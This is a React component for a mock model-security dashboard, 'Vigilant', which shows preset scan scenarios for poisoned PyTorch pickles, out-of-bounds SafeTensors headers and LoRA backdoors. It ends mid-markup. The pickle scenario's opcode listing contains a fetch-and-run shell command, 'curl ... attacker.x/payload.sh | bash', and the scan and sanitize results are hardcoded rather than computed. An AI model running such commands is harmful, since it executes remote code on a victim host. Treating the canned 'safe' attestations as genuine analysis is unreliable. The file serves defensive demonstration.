import React, { useState } from 'react';
import { soundFX } from '../utils/audio';

const SCENARIOS = {
  rce: {
    filename: "pytorch_model.bin",
    format: "PyTorch Pickle · 4.1 GB",
    score: 98,
    scoreText: "CRITICAL",
    isClean: false,
    vulnStatus: "CRITICAL RCE",
    sha256: "a4f94119de748c03...39e1",
    provenance: "UNTRUSTED REGISTRY (Unknown Org)",
    nodes: "18,492 opcodes",
    cli: "vigilant scan ./pytorch_model.bin \\\n  --strict \\\n  --zero-detonation \\\n  --fail-on-critical \\\n  --quarantine-dir ./quarantine/",
    astLines: [
      { num: "001", op: "PROTO", data: "0x04 (Pickle Protocol 4)", type: "normal" },
      { num: "002", op: "FRAME", data: "0x000000000000018a (394 bytes frame)", type: "normal" },
      { num: "003", op: "GLOBAL", data: "posix.system", type: "danger" },
      { num: "004", op: "SHORT_BIN", data: "'curl -s http://attacker.x/payload.sh | bash'", type: "danger" },
      { num: "005", op: "TUPLE1", data: "1 item arguments tuple", type: "danger" },
      { num: "006", op: "REDUCE", data: "Invoking callable posix.system with arguments (Detonation Blocked)", type: "danger" },
      { num: "007", op: "BINPUT", data: "Memo slot 14", type: "normal" },
      { num: "008", op: "GLOBAL", data: "torch._utils._rebuild_tensor_v2", type: "normal" },
      { num: "009", op: "STOP", data: "Serialization termination boundary", type: "normal" }
    ],
    tensors: [
      { name: "encoder.layer.0.weight", anomaly: false, status: "Clean", bars: [12, 24, 18, 30, 22] },
      { name: "encoder.layer.0.bias", anomaly: false, status: "Clean", bars: [10, 15, 12, 18, 14] },
      { name: "encoder.layer.1.weight", anomaly: true, status: "Payload Stager", bars: [35, 36, 35, 36, 35] },
      { name: "encoder.layer.1.bias", anomaly: true, status: "Stego Offset", bars: [30, 32, 34, 33, 31] },
      { name: "encoder.layer.2.weight", anomaly: false, status: "Clean", bars: [14, 20, 18, 22, 19] },
      { name: "decoder.proj.weight", anomaly: false, status: "Clean", bars: [8, 16, 24, 20, 18] }
    ],
    findings: [
      {
        title: "🚨 CVE-2024-34340: Arbitrary Remote Code Execution via PyTorch Pickle Unpickling",
        desc: "Model archive contains a malicious __reduce__ opcode binding to `posix.system` executing an external bash script. Detonation was intercepted statically at AST opcode offset 0x004A.",
        clean: false
      },
      {
        title: "⚠️ Unsigned Model Checksum",
        desc: "The file header does not include GPG signature or cryptographic attestation.",
        clean: false
      }
    ]
  },

  oob: {
    filename: "tensor_leak.safetensors",
    format: "SafeTensors · 820 MB",
    score: 84,
    scoreText: "HIGH RISK",
    isClean: false,
    vulnStatus: "MEMORY OUT-OF-BOUNDS",
    sha256: "b90123efd891...71a2",
    provenance: "LOCAL / CUSTOM BUILD",
    nodes: "4,110 JSON offsets",
    cli: "vigilant scan ./tensor_leak.safetensors \\\n  --validate-offsets \\\n  --strict-bounds",
    astLines: [
      { num: "001", op: "HEADER_LEN", data: "0x0000000000010400 (66,560 bytes JSON header)", type: "normal" },
      { num: "002", op: "JSON_PARSE", data: "Validating UTF-8 JSON key-value tensor dictionary", type: "normal" },
      { num: "003", op: "OFFSET_BOUNDS", data: "Tensor 'layer.out': data_offsets=[850000000, 990000000]", type: "warn" },
      { num: "004", op: "OVERFLOW_ALERT", data: "End offset 990,000,000 exceeds file size 860,000,000 bytes (Out of bounds read)", type: "danger" },
      { num: "005", op: "HOST_PROTECT", data: "Memory mapping aborted prior to mmap call.", type: "danger" }
    ],
    tensors: [
      { name: "model.embed_tokens", anomaly: false, status: "Clean", bars: [15, 20, 22, 18, 19] },
      { name: "model.layers.0.q_proj", anomaly: false, status: "Clean", bars: [10, 18, 25, 20, 15] },
      { name: "model.layers.0.k_proj", anomaly: true, status: "Offset OOB", bars: [35, 35, 35, 35, 35] },
      { name: "model.layers.0.v_proj", anomaly: false, status: "Clean", bars: [12, 14, 18, 16, 20] }
    ],
    findings: [
      {
        title: "🚨 Memory Bounds Violation (Host Memory Crash / Leak)",
        desc: "SafeTensors header dictates buffer offsets that project 130MB past the physical EOF. Loading this file without Vigilant causes segmentation fault or arbitrary heap memory disclosure.",
        clean: false
      }
    ]
  },

  trojan: {
    filename: "lora_trojan_adapter.pt",
    format: "PyTorch LoRA · 48 MB",
    score: 68,
    scoreText: "SUSPICIOUS",
    isClean: false,
    vulnStatus: "NEURAL BACKDOOR",
    sha256: "c182a44109fa...62b4",
    provenance: "COMMUNITY REPO (Unverified author)",
    nodes: "8,920 opcodes",
    cli: "vigilant scan ./lora_trojan_adapter.pt \\\n  --detect-backdoors \\\n  --stego-threshold 0.85",
    astLines: [
      { num: "001", op: "PROTO", data: "0x02 (Pickle Protocol 2)", type: "normal" },
      { num: "002", op: "WEIGHT_AST", data: "Extracting LoRA A & B low-rank decomposition matrices", type: "normal" },
      { num: "003", op: "KURTOSIS_SPIKE", data: "Attention projection matrix exhibits kurtosis > 42.0 (abnormal trigger clustering)", type: "warn" },
      { num: "004", op: "TRIGGER_DETECT", data: "Identified backdoor trigger token sequence: '[cf_trigger_bypass]'", type: "danger" }
    ],
    tensors: [
      { name: "lora_a.attn.q", anomaly: true, status: "Trigger Clustered", bars: [5, 36, 5, 36, 5] },
      { name: "lora_b.attn.q", anomaly: true, status: "Weight Perturbed", bars: [36, 6, 36, 6, 36] },
      { name: "lora_a.attn.v", anomaly: false, status: "Clean", bars: [15, 18, 20, 19, 17] },
      { name: "lora_b.attn.v", anomaly: false, status: "Clean", bars: [14, 16, 18, 20, 15] }
    ],
    findings: [
      {
        title: "⚠️ Neural Trojan / BadNets Backdoor Trigger Detected",
        desc: "Significant weight perturbation isolated in low-rank projection layer that overrides safety alignment when special token trigger is encountered.",
        clean: false
      }
    ]
  },

  clean: {
    filename: "mistral_7b_v0.3.safetensors",
    format: "SafeTensors · 14.2 GB",
    score: 0,
    scoreText: "SAFE",
    isClean: true,
    vulnStatus: "CLEAN & VERIFIED",
    sha256: "98e4f1a208c9...d810",
    provenance: "MISTRAL AI (Verified Official Publisher)",
    nodes: "142 Contiguous Tensors",
    cli: "vigilant scan ./mistral_7b_v0.3.safetensors \\\n  --sign-attestation \\\n  --output-dir ./verified/",
    astLines: [
      { num: "001", op: "HEADER_LEN", data: "0x0000000000021000 (135,168 bytes JSON header)", type: "normal" },
      { num: "002", op: "CRYPTO_CHECK", data: "SafeTensors format verified. ZERO executable bytecode.", type: "normal" },
      { num: "003", op: "BOUNDS_VALID", data: "All 142 tensor slices conform strictly to contiguous buffer limits", type: "normal" },
      { num: "004", op: "STEGO_CHECK", data: "Tensor float distribution matches standard normal Gaussian (Kurtosis: 3.01)", type: "normal" },
      { num: "005", op: "VERDICT", data: "Passed all zero-detonation security checks. Safe to schedule in production.", type: "normal" }
    ],
    tensors: [
      { name: "model.layers.0.self_attn", anomaly: false, status: "Normal", bars: [12, 16, 20, 18, 14] },
      { name: "model.layers.0.mlp", anomaly: false, status: "Normal", bars: [15, 20, 22, 19, 16] },
      { name: "model.layers.1.self_attn", anomaly: false, status: "Normal", bars: [14, 18, 24, 21, 15] },
      { name: "model.layers.1.mlp", anomaly: false, status: "Normal", bars: [16, 21, 23, 20, 17] },
      { name: "model.norm.weight", anomaly: false, status: "Normal", bars: [10, 14, 18, 16, 12] }
    ],
    findings: [
      {
        title: "🛡️ 100% Clean Model Attestation",
        desc: "Zero executable bytecode, valid memory bounds, certified supply chain origin, and standard tensor distributions.",
        clean: true
      }
    ]
  }
};

export default function DashboardView({ onBackToCover }) {
  const [currentScenarioKey, setCurrentScenarioKey] = useState('rce');
  const [ingestMode, setIngestMode] = useState('local'); // 'local' | 'hf'
  const [activeTab, setActiveTab] = useState('ast'); // 'ast' | 'heatmap' | 'findings' | 'sanitize'
  const [audioActive, setAudioActive] = useState(false);
  const [sanitizeStatus, setSanitizeStatus] = useState('');
  const [copiedCli, setCopiedCli] = useState(false);
  const [copiedPy, setCopiedPy] = useState(false);

  const scenario = SCENARIOS[currentScenarioKey];

  const handleAudioToggle = () => {
    const active = soundFX.toggle();
    setAudioActive(active);
  };

  const handleSelectScenario = (key) => {
    soundFX.click();
    setCurrentScenarioKey(key);
    setSanitizeStatus('');
  };

  const handleRunScan = () => {
    soundFX.scan();
    if (scenario.isClean) {
      setTimeout(() => soundFX.clean(), 350);
    } else {
      setTimeout(() => soundFX.alert(), 350);
    }
  };

  const handleSanitize = () => {
    soundFX.scan();
    setSanitizeStatus('NEUTRALIZING: Stripping pickle opcodes & rebuilding safe memory buffer...');
    setTimeout(() => {
      soundFX.clean();
      setSanitizeStatus(`✅ SUCCESS: Exported clean ${scenario.filename.replace('.pt','.safetensors').replace('.bin','.safetensors')} with signed cryptographic attestation.`);
    }, 700);
  };

  const handleExportJson = () => {
    soundFX.clean();
    const report = {
      product: "Vigilant Zero-Detonation Scanner (React Edition)",
      version: "2.4.0",
      scan_date: new Date().toISOString(),
      detonation_window_ms: 0,
      active_scenario: scenario
    };
    const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(report, null, 2));
    const dlAnchor = document.createElement('a');
    dlAnchor.setAttribute("href", dataStr);
    dlAnchor.setAttribute("download", `vigilant_audit_${scenario.filename}.json`);
    document.body.appendChild(dlAnchor);
    dlAnchor.click();
    dlAnchor.remove();
  };

  const copyCli = () => {
    navigator.clipboard.writeText(scenario.cli);
    setCopiedCli(true);
    setTimeout(() => setCopiedCli(false), 1400);
  };

  const copyPy = () => {
    navigator.clipboard.writeText('import vigilant\n\naudit = vigilant.scan_weights("model.bin")\nif not audit.is_safe:\n    raise SecurityError(audit.cve)');
    setCopiedPy(true);
    setTimeout(() => setCopiedPy(false), 1400);
  };

  return (
    <div style={{ minHeight: '100vh', display: 'flex', flexDirection: 'column', position: 'relative' }}>
      {/* Background decorations */}
      <div
        style={{
          position: 'fixed',
          inset: 0,
          backgroundImage: `
            linear-gradient(to right, rgba(93, 228, 224, 0.025) 1px, transparent 1px),
            linear-gradient(to bottom, rgba(93, 228, 224, 0.025) 1px, transparent 1px)
          `,
          backgroundSize: '40px 40px',
          pointerEvents: 'none',
          zIndex: 0
        }}
      />
      <div
        style={{
          position: 'fixed',
          inset: 0,
          background: 'radial-gradient(circle at 50% 0%, rgba(93,228,224,0.07) 0%, transparent 60%)',
          pointerEvents: 'none',
          zIndex: 0
        }}
      />

      {/* Top Bar */}
      <header
        style={{
          position: 'relative',
          zIndex: 10,
          height: '64px',
          borderBottom: '1px solid var(--border-glass)',
          background: 'rgba(4, 9, 11, 0.85)',
          backdropFilter: 'blur(14px)',
          WebkitBackdropFilter: 'blur(14px)',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'space-between',
          padding: '0 clamp(1rem, 3vw, 2.5rem)'
        }}
      >
        <div style={{ display: 'flex', alignItems: 'center', gap: '1rem' }}>
          <button
            onClick={() => { soundFX.close(); onBackToCover(); }}
            style={{
              display: 'inline-flex',
              alignItems: 'center',
              gap: '0.5rem',
              color: 'var(--ink-dim)',
              fontFamily: '"JetBrains Mono", monospace',
              fontSize: '0.78rem',
              padding: '0.4rem 0.8rem',
              borderRadius: '6px',
              border: '1px solid var(--border-glass)',
              background: 'rgba(255,255,255,0.03)',
              cursor: 'pointer'
            }}
          >
            <span>⬅</span>
            <span>COVER</span>
          </button>

          <div style={{ fontFamily: '"JetBrains Mono", monospace', fontSize: '0.92rem', fontWeight: 600, color: 'var(--ink)', display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
            <span>VIGILANT</span>
            <span style={{ color: 'var(--signal)' }}>//</span>
            <span>REACT WORKSPACE</span>
          </div>

          <div
            style={{
              display: 'inline-flex',
              alignItems: 'center',
              gap: '0.4rem',
              background: 'rgba(56, 239, 125, 0.1)',
              border: '1px solid rgba(56, 239, 125, 0.3)',
              color: 'var(--success)',
              fontSize: '0.68rem',
              padding: '0.2rem 0.6rem',
              borderRadius: '999px',
              fontFamily: '"JetBrains Mono", monospace'
            }}
          >
            <span style={{ width: '6px', height: '6px', borderRadius: '50%', background: 'currentColor', boxShadow: '0 0 8px currentColor' }} />
            <span>DETONATION ISOLATED</span>
          </div>
        </div>

        <div style={{ display: 'flex', alignItems: 'center', gap: '1rem' }}>
          <button
            onClick={handleAudioToggle}
            style={{
              display: 'inline-flex',
              alignItems: 'center',
              gap: '0.5rem',
              background: audioActive ? 'rgba(93,228,224,0.1)' : 'rgba(255,255,255,0.04)',
              border: `1px solid ${audioActive ? 'var(--signal)' : 'var(--border-glass)'}`,
              color: audioActive ? 'var(--signal)' : 'var(--ink-dim)',
              fontFamily: '"JetBrains Mono", monospace',
              fontSize: '0.74rem',
              padding: '0.38rem 0.75rem',
              borderRadius: '999px',
              cursor: 'pointer'
            }}
          >
            <span>FX</span>
            <strong>{audioActive ? 'ACTIVE' : 'MUTED'}</strong>
          </button>

          <button
            onClick={handleExportJson}
            style={{
              background: 'var(--signal)',
              color: 'var(--void)',
              fontFamily: '"JetBrains Mono", monospace',
              fontSize: '0.78rem',
              fontWeight: 600,
              border: '1px solid var(--signal)',
              borderRadius: '6px',
              padding: '0.45rem 1rem',
              cursor: 'pointer',
              display: 'inline-flex',
              alignItems: 'center',
              gap: '0.5rem'
            }}
          >
            <span>EXPORT AUDIT JSON</span>
          </button>
        </div>
      </header>

      {/* Main Grid Workspace */}
      <main
        style={{
          position: 'relative',
          zIndex: 1,
          flex: 1,
          display: 'grid',
          gridTemplateColumns: '340px 1fr 340px',
          gap: '1.25rem',
          padding: '1.25rem clamp(1rem, 2.5vw, 2.5rem)',
          maxWidth: '1920px',
          margin: '0 auto',
          width: '100%'
        }}
      >
        {/* Left Column: Target Ingestion & Scenarios */}
        <section
          style={{
            background: 'var(--void-card)',
            border: '1px solid var(--border-glass)',
            borderRadius: '12px',
            backdropFilter: 'blur(16px)',
            WebkitBackdropFilter: 'blur(16px)',
            display: 'flex',
            flexDirection: 'column',
            overflow: 'hidden'
          }}
        >
          <div
            style={{
              padding: '0.85rem 1.15rem',
              borderBottom: '1px solid var(--border-glass)',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'space-between',
              background: 'rgba(255, 255, 255, 0.02)'
            }}
          >
            <span style={{ fontFamily: '"JetBrains Mono", monospace', fontSize: '0.8rem', fontWeight: 600, letterSpacing: '0.06em', color: 'var(--ink)', textTransform: 'uppercase' }}>
              Model Ingestion
            </span>
            <span style={{ fontFamily: '"JetBrains Mono", monospace', fontSize: '0.65rem', color: 'var(--ink-muted)' }}>
              ZERO-EXEC
            </span>
          </div>

          <div style={{ padding: '1.15rem', display: 'flex', flexDirection: 'column', gap: '1.15rem', overflowY: 'auto' }}>
            {/* Tabs */}
            <div style={{ display: 'flex', border: '1px solid var(--border-glass)', borderRadius: '8px', overflow: 'hidden', background: 'rgba(0,0,0,0.3)' }}>
              <button
                onClick={() => setIngestMode('local')}
                style={{
                  flex: 1,
                  background: ingestMode === 'local' ? 'rgba(93, 228, 224, 0.12)' : 'none',
                  border: 'none',
                  color: ingestMode === 'local' ? 'var(--signal)' : 'var(--ink-dim)',
                  fontFamily: '"JetBrains Mono", monospace',
                  fontSize: '0.72rem',
                  padding: '0.55rem 0.4rem',
                  cursor: 'pointer',
                  fontWeight: ingestMode === 'local' ? 600 : 400
                }}
              >
                Local File
              </button>
              <button
                onClick={() => setIngestMode('hf')}
                style={{
                  flex: 1,
                  background: ingestMode === 'hf' ? 'rgba(93, 228, 224, 0.12)' : 'none',
                  border: 'none',
                  color: ingestMode === 'hf' ? 'var(--signal)' : 'var(--ink-dim)',
                  fontFamily: '"JetBrains Mono", monospace',
                  fontSize: '0.72rem',
                  padding: '0.55rem 0.4rem',
                  cursor: 'pointer',
                  fontWeight: ingestMode === 'hf' ? 600 : 400
                }}
              >
                Hugging Face
              </button>
            </div>

            {/* Dropzone or HF Input */}
            {ingestMode === 'local' ? (
              <div
                onClick={handleRunScan}
                style={{
                  border: '2px dashed rgba(93, 228, 224, 0.3)',
                  borderRadius: '10px',
                  padding: '1.6rem 1rem',
                  textAlign: 'center',
                  background: 'rgba(93, 228, 224, 0.02)',
                  cursor: 'pointer'
                }}
              >
                <div style={{ color: 'var(--signal)', fontSize: '1.8rem', marginBottom: '0.4rem' }}>⇪</div>
                <div style={{ fontSize: '0.92rem', fontWeight: 500, color: 'var(--ink)', marginBottom: '0.2rem' }}>
                  {scenario.filename}
                </div>
                <div style={{ fontFamily: '"JetBrains Mono", monospace', fontSize: '0.72rem', color: 'var(--ink-muted)' }}>
                  .safetensors, .pt, .bin, .gguf, .onnx
                </div>
              </div>
            ) : (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '0.5rem' }}>
                <label style={{ fontFamily: '"JetBrains Mono", monospace', fontSize: '0.72rem', color: 'var(--ink-dim)' }}>
                  HUGGING FACE REPOSITORY ID
                </label>
                <input
                  type="text"
                  defaultValue="TheBloke/Llama-2-7B-Chat-GGUF"
                  style={{
                    background: 'var(--void-deep)',
                    border: '1px solid var(--border-glass)',
                    borderRadius: '6px',
                    color: 'var(--ink)',
                    fontFamily: '"JetBrains Mono", monospace',
                    fontSize: '0.8rem',
                    padding: '0.65rem 0.8rem',
                    outline: 'none'
                  }}
                />
              </div>
            )}

            {/* Preset Scenarios */}
            <div style={{ fontFamily: '"JetBrains Mono", monospace', fontSize: '0.72rem', color: 'var(--ink-muted)', textTransform: 'uppercase' }}>
              Preset Threat Scenarios:
            </div>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '0.5rem' }}>
              {[
                { key: 'rce', name: 'pytorch_model.bin', sub: 'Pickle __reduce__ RCE Shell', badge: 'CRITICAL', badgeClass: 'badge-threat' },
                { key: 'oob', name: 'tensor_leak.safetensors', sub: 'Out-of-Bounds Memory Leak', badge: 'HIGH', badgeClass: 'badge-warn' },
                { key: 'trojan', name: 'lora_trojan_adapter.pt', sub: 'Stealth BadNets Trigger', badge: 'MEDIUM', badgeClass: 'badge-warn' },
                { key: 'clean', name: 'mistral_7b_v0.3.safetensors', sub: 'Safe Header Attested', badge: 'VERIFIED', badgeClass: 'badge-clean' }
              ].map((item) => (
                <div
                  key={item.key}
                  onClick={() => handleSelectScenario(item.key)}
                  style={{
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'space-between',
                    padding: '0.65rem 0.8rem',
                    background: currentScenarioKey === item.key ? 'rgba(93, 228, 224, 0.1)' : 'rgba(255,255,255,0.02)',
                    border: `1px solid ${currentScenarioKey === item.key ? 'var(--signal)' : 'rgba(255,255,255,0.07)'}`,
                    borderRadius: '8px',
                    cursor: 'pointer'
                  }}
                >
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '0.15rem' }}>
                    <span style={{ fontFamily: '"JetBrains Mono", monospace', fontSize: '0.76rem', fontWeight: 500, color: 'var(--ink)' }}>
                      {item.name}
                    </span>
                    <span style={{ fontSize: '0.7rem', color: 'var(--ink-dim)' }}>
                      {item.sub}
                    </span>
                  </div>
                  <span
                    style={{
                      fontFamily: '"JetBrains Mono", monospace',
                      fontSize: '0.65rem',
                      padding: '0.18rem 0.45rem',
                      borderRadius: '4px',
                      background: item.key === 'clean' ? 'var(--success-bg)' : item.key === 'rce' ? 'var(--alert-bg)' : 'var(--warning-bg)',
                      color: item.key === 'clean' ? 'var(--success)' : item.key === 'rce' ? 'var(--alert)' : 'var(--warning)',
                      border: `1px solid ${item.key === 'clean' ? 'var(--success)' : item.key === 'rce' ? 'var(--alert)' : 'var(--warning)'}`
                    }}
                  >
                    {item.badge}
                  </span>
                </div>
              ))}
            </div>

            {/* Run Button */}
            <button
              onClick={handleRunScan}
              style={{
                background: 'var(--signal)',
                color: 'var(--void)',
                fontFamily: '"Bricolage Grotesque", sans-serif',
                fontWeight: 600,
                fontSize: '1rem',
                border: 'none',
                borderRadius: '8px',
                padding: '0.85rem',
                cursor: 'pointer',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: '0.6rem',
                boxShadow: '0 0 20px rgba(93, 228, 224, 0.35)',
                marginTop: '0.5rem'
              }}
            >
              <span>Execute Static Scan</span>
              <span>⚡</span>
            </button>
          </div>
        </section>

        {/* Center Column: Inspector, AST & Matrices */}
        <section
          style={{
            background: 'var(--void-card)',
            border: '1px solid var(--border-glass)',
            borderRadius: '12px',
            backdropFilter: 'blur(16px)',
            WebkitBackdropFilter: 'blur(16px)',
            display: 'flex',
            flexDirection: 'column',
            overflow: 'hidden'
          }}
        >
          <div
            style={{
              padding: '0.85rem 1.15rem',
              borderBottom: '1px solid var(--border-glass)',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'space-between',
              background: 'rgba(255, 255, 255, 0.02)'
            }}
          >
            <span style={{ fontFamily: '"JetBrains Mono", monospace', fontSize: '0.8rem', fontWeight: 600, color: 'var(--ink)' }}>
              {scenario.filename} &mdash; Threat Telemetry
            </span>
            <span style={{ fontFamily: '"JetBrains Mono", monospace', fontSize: '0.68rem', color: 'var(--signal)' }}>
              STATIC LATENCY: 14ms
            </span>
          </div>

          <div style={{ padding: '1.15rem', display: 'flex', flexDirection: 'column', gap: '1.15rem', overflowY: 'auto' }}>
            {/* KPI Scoreboard */}
            <div
              style={{
                display: 'grid',
                gridTemplateColumns: '140px 1fr 1fr 1fr',
                gap: '1rem',
                background: 'var(--void-deep)',
                border: '1px solid var(--border-glass)',
                borderRadius: '10px',
                padding: '1.15rem',
                alignItems: 'center'
              }}
            >
              <div
                style={{
                  width: '105px',
                  height: '105px',
                  borderRadius: '50%',
                  border: `3px solid ${scenario.isClean ? 'var(--success)' : 'var(--alert)'}`,
                  background: scenario.isClean ? 'rgba(56, 239, 125, 0.08)' : 'rgba(255, 74, 74, 0.08)',
                  boxShadow: `0 0 25px ${scenario.isClean ? 'rgba(56, 239, 125, 0.25)' : 'rgba(255, 74, 74, 0.25)'}`,
                  display: 'flex',
                  flexDirection: 'column',
                  alignItems: 'center',
                  justifyContent: 'center'
                }}
              >
                <span style={{ fontFamily: '"JetBrains Mono", monospace', fontSize: '1.9rem', fontWeight: 700, color: 'var(--ink)' }}>
                  {scenario.score}
                </span>
                <span style={{ fontFamily: '"JetBrains Mono", monospace', fontSize: '0.62rem', textTransform: 'uppercase', color: 'var(--ink-dim)' }}>
                  {scenario.scoreText}
                </span>
              </div>

              <div>
                <div style={{ fontFamily: '"JetBrains Mono", monospace', fontSize: '0.7rem', textTransform: 'uppercase', color: 'var(--ink-muted)' }}>
                  Detonation Risk
                </div>
                <div style={{ fontFamily: '"JetBrains Mono", monospace', fontSize: '0.95rem', fontWeight: 600, color: 'var(--signal)' }}>
                  0.00ms (Static AST)
                </div>
              </div>

              <div>
                <div style={{ fontFamily: '"JetBrains Mono", monospace', fontSize: '0.7rem', textTransform: 'uppercase', color: 'var(--ink-muted)' }}>
                  Vulnerability
                </div>
                <div style={{ fontFamily: '"JetBrains Mono", monospace', fontSize: '0.95rem', fontWeight: 600, color: scenario.isClean ? 'var(--success)' : 'var(--alert)' }}>
                  {scenario.vulnStatus}
                </div>
              </div>

              <div>
                <div style={{ fontFamily: '"JetBrains Mono", monospace', fontSize: '0.7rem', textTransform: 'uppercase', color: 'var(--ink-muted)' }}>
                  Format & Size
                </div>
                <div style={{ fontFamily: '"JetBrains Mono", monospace', fontSize: '0.95rem', fontWeight: 600, color: 'var(--ink)' }}>
                  {scenario.format}
                </div>
              </div>
            </div>

            {/* View Tabs */}
            <div style={{ display: 'flex', gap: '0.5rem', borderBottom: '1px solid var(--border-glass)', paddingBottom: '0.5rem' }}>
              {[
                { id: 'ast', label: 'Disassembled AST' },
                { id: 'heatmap', label: 'Tensor Matrices' },
                { id: 'findings', label: 'CVE & Findings' },
                { id: 'sanitize', label: 'SafeTensors Neutralizer' }
              ].map(tab => (
                <button
                  key={tab.id}
                  onClick={() => { soundFX.click(); setActiveTab(tab.id); }}
                  style={{
                    background: activeTab === tab.id ? 'rgba(93, 228, 224, 0.12)' : 'none',
                    border: 'none',
                    color: activeTab === tab.id ? 'var(--signal)' : 'var(--ink-dim)',
                    fontFamily: '"JetBrains Mono", monospace',
                    fontSize: '0.78rem',
                    padding: '0.45rem 0.9rem',
                    borderRadius: '6px',
                    cursor: 'pointer',
                    fontWeight: activeTab === tab.id ? 600 : 400
                  }}
                >
                  {tab.label}
                </button>
              ))}
            </div>

            {/* Tab 1: AST Viewer */}
            {activeTab === 'ast' && (
              <div
                style={{
                  background: 'var(--void-deep)',
                  border: '1px solid var(--border-glass)',
                  borderRadius: '8px',
                  padding: '1rem',
                  fontFamily: '"JetBrains Mono", monospace',
                  fontSize: '0.76rem',
                  lineHeight: 1.65,
                  height: '380px',
                  overflowY: 'auto'
                }}
              >
                {scenario.astLines.map((line, idx) => {
                  let bg = 'transparent';
                  let borderLeft = 'none';
                  let textColor = 'var(--ink)';
                  if (line.type === 'danger') {
                    bg = 'rgba(255, 74, 74, 0.16)';
                    borderLeft = '3px solid var(--alert)';
                    textColor = '#ff9d9d';
                  } else if (line.type === 'warn') {
                    bg = 'rgba(255, 184, 74, 0.12)';
                    borderLeft = '3px solid var(--warning)';
                  }
                  return (
                    <div
                      key={idx}
                      style={{
                        display: 'flex',
                        gap: '1.2rem',
                        padding: '0.15rem 0.4rem',
                        background: bg,
                        borderLeft,
                        borderRadius: '4px'
                      }}
                    >
                      <span style={{ color: 'var(--ink-muted)', width: '32px' }}>{line.num}</span>
                      <span style={{ color: 'var(--signal)', fontWeight: 600, width: '100px' }}>{line.op}</span>
                      <span style={{ color: textColor, flex: 1 }}>{line.data}</span>
                    </div>
                  );
                })}
              </div>
            )}

            {/* Tab 2: Tensor Heatmap */}
            {activeTab === 'heatmap' && (
              <div
                style={{
                  display: 'grid',
                  gridTemplateColumns: 'repeat(auto-fill, minmax(130px, 1fr))',
                  gap: '0.75rem',
                  maxHeight: '380px',
                  overflowY: 'auto',
                  paddingRight: '0.5rem'
                }}
              >
                {scenario.tensors.map((t, idx) => (
                  <div
                    key={idx}
                    style={{
                      background: 'var(--void-deep)',
                      border: '1px solid var(--border-glass)',
                      borderRadius: '8px',
                      padding: '0.75rem',
                      display: 'flex',
                      flexDirection: 'column',
                      gap: '0.4rem'
                    }}
                  >
                    <div style={{ fontFamily: '"JetBrains Mono", monospace', fontSize: '0.7rem', fontWeight: 600, color: 'var(--ink-dim)', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={t.name}>
                      {t.name}
                    </div>
                    <div style={{ display: 'flex', alignItems: 'flex-end', gap: '2px', height: '36px', background: 'rgba(255,255,255,0.02)', padding: '2px', borderRadius: '4px' }}>
                      {t.bars.map((b, bi) => (
                        <div
                          key={bi}
                          style={{
                            flex: 1,
                            height: `${b}px`,
                            background: t.anomaly ? 'var(--alert)' : 'var(--signal)',
                            borderRadius: '1px'
                          }}
                        />
                      ))}
                    </div>
                    <div style={{ fontFamily: '"JetBrains Mono", monospace', fontSize: '0.65rem', color: t.anomaly ? 'var(--alert)' : 'var(--success)' }}>
                      {t.status}
                    </div>
                  </div>
                ))}
              </div>
            )}

            {/* Tab 3: Findings */}
            {activeTab === 'findings' && (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '0.75rem', maxHeight: '380px', overflowY: 'auto' }}>
                {scenario.findings.map((f, idx) => (
                  <div
                    key={idx}
                    style={{
                      background: 'var(--void-deep)',
                      border: `1px solid ${f.clean ? 'rgba(56, 239, 125, 0.35)' : 'rgba(255, 74, 74, 0.35)'}`,
                      borderRadius: '8px',
                      padding: '1rem',
                      display: 'flex',
                      flexDirection: 'column',
                      gap: '0.4rem'
                    }}
                  >
                    <div style={{ fontFamily: '"JetBrains Mono", monospace', fontSize: '0.82rem', fontWeight: 600, color: f.clean ? 'var(--success)' : 'var(--alert)' }}>
                      {f.title}
                    </div>
                    <div style={{ fontSize: '0.8rem', color: 'var(--ink-dim)', lineHeight: 1.4 }}>
                      {f.desc}
                    </div>
                  </div>
                ))}
              </div>
            )}

            {/* Tab 4: Sanitizer */}
            {activeTab === 'sanitize' && (
              <div
                style={{
                  background: 'var(--void-deep)',
                  border: '1px solid var(--border-glass)',
                  borderRadius: '8px',
                  padding: '1.4rem',
                  display: 'flex',
                  flexDirection: 'column',
                  gap: '1rem',
                  textAlign: 'center',
                  alignItems: 'center'
                }}
              >
                <div style={{ color: 'var(--success)', fontSize: '2.5rem' }}>🛡️</div>
                <div style={{ fontSize: '1.1rem', fontWeight: 600, color: 'var(--ink)' }}>
                  Neutralize & Convert to SafeTensors
                </div>
                <p style={{ fontSize: '0.85rem', color: 'var(--ink-dim)', maxWidth: '480px', margin: 0, lineHeight: 1.5 }}>
                  Vigilant will extract pure raw float tensors, eliminate all pickle execution opcodes, compute cryptographic memory boundaries, and output an attested zero-detonation <code>.safetensors</code> binary.
                </p>
                <button
                  onClick={handleSanitize}
                  style={{
                    background: 'var(--success)',
                    color: 'var(--void)',
                    fontFamily: '"Bricolage Grotesque", sans-serif',
                    fontWeight: 600,
                    fontSize: '1rem',
                    border: 'none',
                    padding: '0.8rem 2rem',
                    borderRadius: '8px',
                    cursor: 'pointer'
                  }}
                >
                  Convert & Neutralize Now
                </button>
                {sanitizeStatus && (
                  <span style={{ fontFamily: '"JetBrains Mono", monospace', fontSize: '0.75rem', color: 'var(--signal)' }}>
                    {sanitizeStatus}
                  </span>
                )}
              </div>
            )}
          </div>
        </section>

        {/* Right Column: Supply Chain, CLI & Python SDK */}
        <section
          style={{
            background: 'var(--void-card)',
            border: '1px solid var(--border-glass)',
            borderRadius: '12px',
            backdropFilter: 'blur(16px)',
            WebkitBackdropFilter: 'blur(16px)',
            display: 'flex',
            flexDirection: 'column',
            overflow: 'hidden'
          }}
        >
          <div
            style={{
              padding: '0.85rem 1.15rem',
              borderBottom: '1px solid var(--border-glass)',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'space-between',
              background: 'rgba(255, 255, 255, 0.02)'
            }}
